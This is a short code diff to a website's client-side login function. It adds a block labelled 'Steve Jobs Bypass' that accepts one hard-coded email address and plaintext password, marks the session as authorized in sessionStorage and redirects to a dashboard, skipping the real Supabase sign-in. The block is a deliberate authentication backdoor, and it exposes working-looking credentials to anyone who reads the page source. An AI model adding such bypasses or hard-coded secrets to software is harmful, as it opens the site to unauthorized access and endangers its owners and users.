@@ -238,6 +238,14 @@
                 return;
             }
 
+            // Steve Jobs Bypass (Procell)
+            if (email === 'procell.bip@gmail.com' && password === 'Llave2026$') {
+                sessionStorage.setItem('macwave_session', 'authorized');
+                sessionStorage.setItem('macwave_user', 'procell.bip@gmail.com');
+                window.location.href = 'dashboard-ods.html';
+                return;
+            }
+
             try {
                 const { data, error } = await supabaseClient.auth.signInWithPassword({
                     email: email,
